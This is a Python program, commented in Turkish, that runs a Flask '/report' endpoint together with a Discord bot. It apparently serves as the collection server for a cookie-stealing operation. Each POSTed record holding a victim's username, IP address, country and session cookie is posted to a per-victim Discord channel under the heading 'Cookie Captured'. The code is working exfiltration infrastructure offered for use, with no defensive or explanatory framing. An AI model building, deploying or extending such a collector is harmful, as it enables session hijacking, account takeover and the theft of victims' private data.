import os
import asyncio
import discord
from discord.ext import commands
from flask import Flask, request, jsonify
from dotenv import load_dotenv
import threading

load_dotenv()
TOKEN = os.getenv("DISCORD_TOKEN")
GUILD_ID = int(os.getenv("GUILD_ID"))

print(f"Token yüklendi: {'EVET' if TOKEN else 'HAYIR'}")
print(f"Guild ID: {GUILD_ID}")

intents = discord.Intents.default()
bot = commands.Bot(command_prefix="!", intents=intents)
app = Flask(__name__)
queue = asyncio.Queue()
bot_loop = None

@bot.event
async def on_ready():
    global bot_loop
    bot_loop = asyncio.get_running_loop()
    print(f"Bot hazır: {bot.user}")
    guild = bot.get_guild(GUILD_ID)
    if guild:
        print(f"Sunucu: {guild.name} (ID: {guild.id})")
    else:
        print(f"HATA: {GUILD_ID} ID'li sunucu bulunamadı!")
    bot_loop.create_task(process_queue())

async def process_queue():
    while True:
        data = await queue.get()
        try:
            guild = bot.get_guild(GUILD_ID)
            if not guild:
                print("Sunucu bulunamadı")
                continue

            username = data.get("username", "unknown")
            safe_name = "".join(c for c in username if c.isalnum() or c in "-_")[:90]
            if not safe_name:
                safe_name = "unknown"
            channel_name = f"user-{safe_name}"

            existing = discord.utils.get(guild.text_channels, name=channel_name)
            if existing:
                channel = existing
                print(f"Kanal zaten var: {channel_name}")
            else:
                channel = await guild.create_text_channel(channel_name)
                print(f"Kanal oluşturuldu: {channel_name}")
                await asyncio.sleep(6)

            embed = discord.Embed(title="Cookie Captured", color=0x5b8def)
            embed.add_field(name="User", value=f"**{username}**", inline=True)
            embed.add_field(name="Country", value=data.get("country", "?"), inline=True)
            embed.add_field(name="IP", value=data.get("ip", "?"), inline=True)

            await channel.send(embed=embed)
            if data.get("cookie"):
                await channel.send(f"```\n{data['cookie']}\n```")

            print(f"Gönderildi: {username} -> #{channel_name}")
        except Exception as e:
            print(f"HATA: {e}")
        finally:
            queue.task_done()
            await asyncio.sleep(2)

@app.route("/report", methods=["POST"])
def report():
    data = request.get_json(force=True, silent=True) or {}
    print(f"İstek alındı: {data.get('username', '?')}")
    if bot_loop is not None:
        asyncio.run_coroutine_threadsafe(queue.put(data), bot_loop)
    else:
        print("HATA: Bot loop henüz hazır değil!")
    return jsonify({"status": "queued"}), 200

def run_flask():
    # Render'ın atadığı portu (PORT) kullan, yoksa 8080 kullan
    port = int(os.environ.get("PORT", 8080))
    app.run(host="0.0.0.0", port=port, debug=False, use_reloader=False)

if __name__ == "__main__":
    # Flask'ı arka plan thread'inde başlat
    threading.Thread(target=run_flask, daemon=True).start()
    # Discord botunu ANA THREAD'de başlat (Sinyalleri alabilmesi için)
    bot.run(TOKEN)
